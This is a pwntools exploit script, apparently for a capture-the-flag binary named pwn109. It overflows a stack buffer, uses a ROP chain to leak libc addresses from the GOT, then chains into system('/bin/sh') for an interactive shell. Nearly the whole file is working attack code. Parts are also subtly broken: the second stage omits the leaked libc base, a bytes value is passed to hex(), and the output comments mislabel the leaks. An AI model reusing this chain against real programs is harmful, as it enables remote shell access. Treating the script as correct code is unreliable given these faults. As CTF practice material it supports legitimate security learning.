#!/usr/bin/python3 

from pwn import *
import re, time


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())



# Set up pwntools for the correct architecture
exe = './pwn109_patched_patched'
context.binary = bin = ELF("./pwn109_patched_patched")
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
libc = ELF('./libc6_2.27-3ubuntu1.4_amd64.so')
ld = ELF('./ld-2.27.so')

# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'
io = process([ld.path, bin.path], env={"LD_PRELOAD": libc.path})
#io = start()

#io.clean()


padding = 40

POP_RDI = 0x004012a3

payload = flat(
    b'A' * padding,
    POP_RDI,
    elf.got['puts'],
    elf.plt['puts'],
    POP_RDI,
    elf.got['gets'],
    elf.plt['puts'],
    POP_RDI,
    elf.got['setvbuf'],
    elf.plt['puts'],
    elf.symbols['main']

)

write('payload', payload)

#io.clean()
io.recvuntil(b'ahead')
io.recvline()
io.sendline(payload)


addr = io.recvline()
puts_address = u64(addr.strip().ljust(8, b'\0'))
log.info(f'puts() address: {hex(puts_address)}')

addr = io.recvline()
gets_address = u64(addr.strip().ljust(8, b'\0'))
log.info(f'gets() address: {hex(gets_address)}')

addr = io.recvline()
setvbuf_address = u64(addr.strip().ljust(8, b'\0'))
log.info(f'setvbuf() address: {hex(setvbuf_address)}')

# output:
# [*] gets() address: 0x7feeb6f7caa0
# [*] gets() address: 0x7feeb6f7c190
# [*] gets() address: 0x7feeb6f7d3d0

# use this https://libc.rip/

# # Load the address of '/bin/sh' in libc into rdi
# payload += p64(next(elf.search(asm('pop rdi ; ret;'))))
# payload += p64(next(libc.search(b'/bin/sh')))
# # return to system() in libc - we need an additional ret because of MOVAPS
# payload += p64(next(elf.search(asm('ret;'))))
# payload += p64(libc.symbols.system)

# print('bin/sh = {}'.format(hex(puts_address+0x13337A) ))
# print('system = {}'.format(hex(puts_address-0x31550) ))

POP_RDI = p64(next(elf.search(asm('pop rdi ; ret;'))))
binsh = p64(next(libc.search(b'/bin/sh')))
ret = p64(next(elf.search(asm('ret;'))))
System = p64(libc.symbols.system)

print(hex(binsh))


# #io.interactive()
# #0x21bf7
payload = flat(
    b'A' * padding,
    POP_RDI,
    binsh,
    System
)

io.sendline(payload)
io.interactive()